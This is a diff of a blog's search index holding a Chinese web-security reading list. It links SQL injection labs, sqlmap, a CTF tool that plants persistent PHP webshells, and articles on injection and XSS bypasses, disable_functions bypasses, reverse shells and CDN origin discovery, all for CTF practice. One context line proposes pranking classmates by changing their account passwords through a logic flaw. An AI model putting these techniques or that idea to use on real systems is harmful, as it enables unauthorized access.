+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> sqli-labs 经典的练习SQL注入的靶场 </li>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a> DVWA 经典的基础漏洞的练习靶场</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/wonderkun/CTF_web">https://github.com/wonderkun/CTF_web</a> 一个CTF的web项目</li>
+</ol>
+<h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a> 超经典的SQL注入工具</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> 脚本调用框架，用于渗透测试中 采集|爬虫|爆破|批量PoC 等需要并发的任务。 </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Hecbi/awd_auto_attack">https://github.com/Hecbi/awd_auto_attack</a> 一个自动化写入php不死马/进程守护马，批量获得flag的线下赛工具 </li>
+</ol>
+<h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/komeiji-satori/Dress">https://github.com/komeiji-satori/Dress</a> 女装项目 </li>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/StylishThemes/GitHub-Dark">https://github.com/StylishThemes/GitHub-Dark</a> 黑暗风格的github</li>
+</ol>
+<h2 id="三、CTF相关"><a href="#三、CTF相关" class="headerlink" title="三、CTF相关"></a>三、CTF相关</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/xss-collect.html">https://www.leavesongs.com/PENETRATION/xss-collect.html</a> XSS的一些绕过方法 </li>
+<li><input disabled="" type="checkbox"> <a href="https://blog.csdn.net/u011377996/article/details/80787236">https://blog.csdn.net/u011377996/article/details/80787236</a> 安恒杯6月wp </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/164569">https://www.anquanke.com/post/id/164569</a> LCTF wp </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/118149.html">https://www.freebuf.com/articles/web/118149.html</a> CTF搅屎指南 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg">https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg</a> NCTF部分题解</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2308">https://xz.aliyun.com/t/2308</a> 用python继承链搞事情</li>
+<li><input disabled="" type="checkbox"> <a href="http://www.cnblogs.com/Vinson404/p/7253255.html">http://www.cnblogs.com/Vinson404/p/7253255.html</a> SQL注入绕过</li>
+<li><input disabled="" type="checkbox"> <a href="https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/">https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/</a> SOME攻击</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/159206">https://www.anquanke.com/post/id/159206</a> 四个实例递进php反序列化漏洞理解  </li>
+</ol>
+<h3 id="关于SQL注入中的Unicode安全，顺序浏览"><a href="#关于SQL注入中的Unicode安全，顺序浏览" class="headerlink" title="关于SQL注入中的Unicode安全，顺序浏览"></a>关于SQL注入中的Unicode安全，顺序浏览</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://skysec.top/2018/03/21/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%B7%B1%E5%85%A5mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E6%AF%94%E5%AF%B9%E6%96%B9%E6%B3%95collation/">从一道题深入mysql字符集与比对方法collation</a></li>
+<li><input disabled="" type="checkbox"> <a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html">Collation chart for utf8_general_ci</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">Mysql字符编码利用技巧 </a></li>
+</ul>
+<h3 id="巧用LD-PRELOAD突破disable-functions"><a href="#巧用LD-PRELOAD突破disable-functions" class="headerlink" title="巧用LD_PRELOAD突破disable_functions"></a>巧用LD_PRELOAD突破disable_functions</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/175403">1. 深入浅出LD_PRELOAD &amp; putenv()</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/192052.html">2. 无需sendmail：巧用LD_PRELOAD突破disable_functions</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">3. bypass disable_functions via LD_PRELOAD</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/AntSwordProject/ant_php_extension">4. Ant PHP Extension</a> </li>
+</ul>
+<h3 id="fpm绕过disable-functions"><a href="#fpm绕过disable-functions" class="headerlink" title="fpm绕过disable_functions"></a>fpm绕过disable_functions</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">1. Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/5598">2. 浅析php-fpm的攻击方式</a></li>
+<li><input disabled="" type="checkbox"> <a href="https://evoa.me/index.php/archives/52/">3. PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP</a> </li>
+</ul>
+<h2 id="四、一些值得学习的好文章"><a href="#四、一些值得学习的好文章" class="headerlink" title="四、一些值得学习的好文章"></a>四、一些值得学习的好文章</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/128">https://xz.aliyun.com/t/128</a> 浅析自动绑定漏洞</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a> Linux 反弹shell（一）文件描述符与重定向</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a> Linux 反弹shell（二）反弹shell的本质</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/xiaozi/p/12963549.html">https://www.cnblogs.com/xiaozi/p/12963549.html</a> 绕过CDN查找真实IP</li>
+</ol>
+<h2 id="五、资料库"><a href="#五、资料库" class="headerlink" title="五、资料库"></a>五、资料库</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://www.securityfocus.com/">https://www.securityfocus.com/</a> Bugtraq SecurityFocus </li>
+<li><input disabled="" type="checkbox"> <a href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a> Packet Storm</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.seebug.org/">https://www.seebug.org/</a> Seebug</li>
+<li><input disabled="" type="checkbox"> <a href="http://www.anquan.us/">http://www.anquan.us/</a> 乌云镜像站 </li>
+<li><input disabled="" type="checkbox"> <a href="https://wizardforcel.gitbooks.io/web-hacking-101/content/">https://wizardforcel.gitbooks.io/web-hacking-101/content/</a> 实战案例</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2231">https://xz.aliyun.com/t/2231</a> 安全帮－零基础web安全学习终极攻略</li>
+<li><input disabled="" type="checkbox"> <a href="https://portswigger.net/web-security/dashboard">https://portswigger.net/web-security/dashboard</a>  burp学院，最适合新手入门的指导资料</li>
+</ol>
+<h2 id="六、杂"><a href="#六、杂" class="headerlink" title="六、杂"></a>六、杂</h2><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://blog.coding.net/blog/CS-Hexo">https://blog.coding.net/blog/CS-Hexo</a> Hexo搭建博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://50-jahre-hitparade.ch/">https://50-jahre-hitparade.ch/</a> 好玩的网站 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/zhangziqiang/p/7478075.html">https://www.cnblogs.com/zhangziqiang/p/7478075.html</a> Linux Shell常用shell命令 </li>
+<li><input disabled="" type="checkbox"> <a href="http://tour.ubuntu.com/zh-CN/#surf-the-web">http://tour.ubuntu.com/zh-CN/#surf-the-web</a> 在线ubuntu虚拟机 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.jianshu.com/p/444883157618">https://www.jianshu.com/p/444883157618</a> java两天速成</li>
+</ol>
 ]]></content>
   </entry>
   <entry>
@@ -762,11 +741,10 @@
 <p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下：<br>80.http.get.headers.server:cloudflare</p>
 ]]></content>
       <categories>
-        <category>信息收集</category>
+        <category>SRC</category>
       </categories>
       <tags>
-        <tag>CDN</tag>
-        <tag>IP</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -831,7 +809,7 @@
 <p>（这次挖掘就到这里，可以用这个逻辑漏洞去修改沙雕群友的项目系统的账号密码了，小小的整蛊一下。）</p>
 ]]></content>
       <categories>
-        <category>漏洞挖掘</category>
+        <category>SRC</category>
       </categories>
       <tags>
         <tag>XSS</tag>
@@ -1000,7 +978,6 @@
       </categories>
       <tags>
         <tag>SSTI</tag>
-        <tag>flask</tag>
       </tags>
   </entry>
 </search>
